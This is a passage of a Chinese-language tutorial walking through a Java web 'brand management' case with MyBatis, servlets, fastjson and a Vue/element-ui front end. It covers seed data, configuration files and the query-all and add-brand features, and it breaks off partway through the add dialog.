       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;三只松鼠&#x27;</span>, <span class="hljs-string">&#x27;三只松鼠股份有限公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;好吃不上火&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>);</code></pre>

<h4 id="2-3-配置信息"><a href="#2-3-配置信息" class="headerlink" title="2.3 配置信息"></a>2.3 配置信息</h4><h5 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h5><p>将mybatis的配置文件<code>mybatis-config.xml</code>copy到<code>src/main/resource</code>目录下</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">configuration</span></span>
<span class="hljs-meta">        <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span>
<span class="hljs-meta">        <span class="hljs-meta-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.pojo&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span>
                
               <span class="hljs-comment">&lt;!-- 配置数据名 javastudy 用户名和密码--&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql:///javastudy?useSSL=false&quot;</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>
       <span class="hljs-comment">&lt;!--扫描mapper 这里根据项目的mapper目录配置--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.mapper&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre>

<h5 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h5><p><code>pom.xml</code></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span>
<span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
<span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>brand-case<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!--web项目将打包成war格式 </span>
<span class="hljs-comment">		普通项目则为jar </span>
<span class="hljs-comment">	--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>


    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-comment">&lt;!--Servlet--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

		
        <span class="hljs-comment">&lt;!--MyBatis依赖--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-comment">&lt;!--MySQL--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.34<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>


        <span class="hljs-comment">&lt;!--fastjson json转object时用到--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>


    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- 这里可以配置tomcat的port和根路径 --&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre>

<h5 id="包"><a href="#包" class="headerlink" title="包"></a>包</h5><p>在<code>/scr/main/java</code>中新建<code>pojo</code>、<code>mapper</code>、<code>service</code>、<code>web</code>、<code>util</code>等包</p>
<table>
<thead>
<tr>
<th>包名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>pojo</td>
<td>存放实体类，比如Brand、User等</td>
</tr>
<tr>
<td>mapper</td>
<td>存放对应的Mapper接口 比如BrandMapper</td>
</tr>
<tr>
<td>service</td>
<td>存放提供服务的类BrandService</td>
</tr>
<tr>
<td>web</td>
<td>存放web层使用到的Servlet</td>
</tr>
<tr>
<td>util</td>
<td>存放工具包</td>
</tr>
</tbody></table>
<p>创建<code>src/main/resources/com/itheima/mapper/</code>目录，该目录存放<code>BrandMapper.xml</code></p>
<p>该文件在tomcat启动后自动保存到<code>src/main/java/com/itheima/mapper/BrandMapper.xml</code></p>
<h2 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h2><p>登录和注册页面使用html和javascript设计</p>
<p>展示页面使用Vue和element-ui设计出一个简单的展示页面</p>
<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="1-查询所有"><a href="#1-查询所有" class="headerlink" title="1.查询所有"></a>1.查询所有</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>当页面加载完成后，数据需要展示到出来，所以需要在Vue中<code>mounted</code>构造函数中写发送异步请求的代码</li>
<li>并且发送请求时无需携带参数</li>
<li>服务器返回所有数据，其格式为json格式，返回的参数绑定到vue的模型中，显示到页面中</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330140534899.png" alt="image-20220330140534899"></p>
<h4 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao"><a href="#dao" class="headerlink" title="dao"></a>dao</h5><p>在<code>com.itheima.mapper.BrandMapper</code>接口中添加<code>selectAll()</code>方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 查询所有</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select * from tb_brand&quot;)</span>
<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
<span class="hljs-function">List&lt;Brand&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>;</code></pre>

<p>由于表中有些字段名和实体类中的属性名没有对应，所以需要在 <code>com/itheima/mapper/BrandMapper.xml</code> 映射配置文件中定义结果映射 ，使用<code>resultMap</code> 标签。映射配置文件内容如下：</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;brand&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;brandName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;brand_name&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;companyName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;company_name&quot;</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span></code></pre>

<h5 id="service"><a href="#service" class="headerlink" title="service"></a>service</h5><p>在<code>com.itheima.mapper</code>中创建<code>BrandService</code>类</p>
<pre><code class="hljs java">   <span class="hljs-comment">// 获取sqlSessionFactory</span>
<span class="hljs-comment">// 该类 存放在util包中，封装后方便使用</span>
   SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory();

   <span class="hljs-comment">/**</span>
<span class="hljs-comment">    * 查询所有</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">    */</span>
   <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Brand&gt; <span class="hljs-title">selectAll</span><span class="hljs-params">()</span></span>&#123;
       SqlSession sqlSession = sqlSessionFactory.openSession();
       <span class="hljs-comment">// 获取 BrandMapper</span>
       BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);
	<span class="hljs-comment">// 调用方法</span>
       List&lt;Brand&gt; brands = mapper.selectAll();
       sqlSession.close();
       <span class="hljs-comment">// 返回查询到的数据</span>
       <span class="hljs-keyword">return</span> brands;
   &#125;</code></pre>

<h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><p>在<code>com.itheima.web</code>中创建<code>SelectAllServlet</code>可以使用Idea提供的模板创建自动继承<code>HttpServlet</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;
<span class="hljs-keyword">import</span> com.itheima.service.BrandService;
<span class="hljs-keyword">import</span> jdk.nashorn.internal.ir.CallNode;

<span class="hljs-keyword">import</span> javax.servlet.*;
<span class="hljs-keyword">import</span> javax.servlet.http.*;
<span class="hljs-keyword">import</span> javax.servlet.annotation.*;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@WebServlet(value = &quot;/selectAllServlet&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SelectAllServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-comment">// 创建BrandService</span>
    <span class="hljs-keyword">private</span> BrandService service = <span class="hljs-keyword">new</span> BrandService();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
		<span class="hljs-comment">// 调用BrandService中的selectAll方法</span>
        List&lt;Brand&gt; brandList = service.selectAll();
        <span class="hljs-comment">// 将brand对象转换为json字符串</span>
        String string = JSON.toJSONString(brandList);
		<span class="hljs-comment">// 设置响应数据类型为json</span>
        response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
        <span class="hljs-comment">//响应数据</span>
        response.getWriter().write(string);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        doGet(request, response);
    &#125;
&#125;
</code></pre>



<h4 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h4><p>前端需要在页面加载完毕后发送 ajax 请求，所以发送请求的逻辑应该放在 <code>mounted()</code> 钩子函数中。而响应回来的数据需要赋值给表格绑定的数据模型，从代码中可以看出表格绑定的数据模型是 <code>brandlist</code></p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--表格--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    &lt;el-table
            :data=&quot;brandlist&quot;
            style=&quot;width: 100%&quot;
            :row-class-name=&quot;tableRowClassName&quot;
            @selection-change=&quot;handleSelectionChange&quot;
    &gt;</code></pre>

<p>ajax请求为</p>
<pre><code class="hljs javascript">methods:&#123;
	<span class="hljs-function"><span class="hljs-title">selectAll</span>(<span class="hljs-params"></span>)</span>&#123;
            <span class="hljs-keyword">var</span> _this = <span class="hljs-built_in">this</span>;
                axios(&#123;
                    method: <span class="hljs-string">&#x27;GET&#x27;</span>,
                    url: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>
                &#125;).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)</span>&#123;
                    <span class="hljs-keyword">var</span> brandlist = response.data;
                    _this.brandlist = brandlist;
                &#125;)
        &#125;
    &#125;
<span class="hljs-function"><span class="hljs-title">mounted</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-built_in">this</span>.selectAll;
&#125;
</code></pre>

<h3 id="2-添加功能"><a href="#2-添加功能" class="headerlink" title="2.添加功能"></a>2.添加功能</h3><h4 id="需求分析-1"><a href="#需求分析-1" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>用户请求后台时需要携带数据，且为post请求，携带的数据类型为json类型</li>
<li>后端服务器获取json数据后将其转换为Brand类型</li>
<li>添加成功后响应前端</li>
</ul>
<h4 id="后端实现-1"><a href="#后端实现-1" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-1"><a href="#dao-1" class="headerlink" title="dao"></a>dao</h5><p>在<code>BrandMapper</code>中添加addBrand()方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 添加</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;)</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addBrand</span><span class="hljs-params">(Brand brand)</span></span>;</code></pre>

<h5 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h5><p>在BrandService中实现addBrand()业务逻辑方法</p>
<pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 添加</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment">   */</span>
  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addBrand</span><span class="hljs-params">(Brand brand)</span></span>&#123;
      SqlSession sqlSession = sqlSessionFactory.openSession();
      BrandMapper mapper = sqlSession.getMapper(BrandMapper.class);

      mapper.addBrand(brand);
<span class="hljs-comment">// 对数据库的增删改 记得提交事务</span>
      sqlSession.commit();
      sqlSession.close();
  &#125;</code></pre>

<h5 id="servlet-1"><a href="#servlet-1" class="headerlink" title="servlet"></a>servlet</h5><p>前端请求时携带json数据，<code>request.getParamter()</code>无法获取，需要使用获取请求体的方法<code>request.getReader()</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;
<span class="hljs-keyword">import</span> com.itheima.service.BrandService;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@WebServlet(value = &quot;/addServlet&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AddServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;
    <span class="hljs-keyword">private</span> BrandService service = <span class="hljs-keyword">new</span> BrandService();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        <span class="hljs-comment">// getParamter无法获取json数据</span>
        BufferedReader reader = request.getReader();
        String line = reader.readLine();
        System.out.println(line);
        <span class="hljs-comment">// 将json数据转换为Brand对象</span>
        Brand brand = JSON.parseObject(line, Brand.class);
        System.out.println(brand);
        service.addBrand(brand);

		<span class="hljs-comment">// 返回的响应数据      </span>
        response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;
        doGet(request, response);
    &#125;
&#125;</code></pre>

<h4 id="前端实现-1"><a href="#前端实现-1" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="添加的对话框"><a href="#添加的对话框" class="headerlink" title="添加的对话框"></a>添加的对话框</h5><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330144307668.png" alt="image-20220330144307668"></p>
<p>初始时该对话框为隐藏状态，其状态有<code>dialogVisible</code>控制，默认情况下为false</p>
<pre><code class="hljs js">&lt;el-dialog
        title=<span class="hljs-string">&quot;添加品牌&quot;</span>
        :visible.sync=<span class="hljs-string">&quot;dialogVisible&quot;</span>
        width=<span class="hljs-string">&quot;30%&quot;</span>
        &gt;</code></pre>

<p>当点击添加按钮时，将<code>dialogVisible</code>设置为<code>true</code>，对话框弹出，便可以编辑数据</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">plain</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = true&quot;</span>&gt;</span>新增<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>

<h5 id="提交数据"><a href="#提交数据" class="headerlink" title="提交数据"></a>提交数据</h5><p>对话框实际上是一个form表单，该表单数据与<code>brand</code>模型绑定，所以请求后端时提交brand即可</p>
<pre><code class="hljs js"><span class="hljs-keyword">new</span> Vue(&#123;
	<span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span>&#123;
	<span class="hljs-keyword">return</span> &#123;
		<span class="hljs-comment">// 品牌模型数据</span>
         brand: &#123;
                    status: <span class="hljs-string">&#x27;&#x27;</span>,
                    brandName: <span class="hljs-string">&#x27;&#x27;</span>,
                    companyName: <span class="hljs-string">&#x27;&#x27;</span>,
                    id:<span class="hljs-string">&quot;&quot;</span>,
                    ordered:<span class="hljs-string">&quot;&quot;</span>,
                    description:<span class="hljs-string">&quot;&quot;</span>
                &#125;,
	&#125;
	&#125;
&#125;)</code></pre>

<p>提交和取消按钮</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addBrand&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-comment">&lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = false&quot;</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>

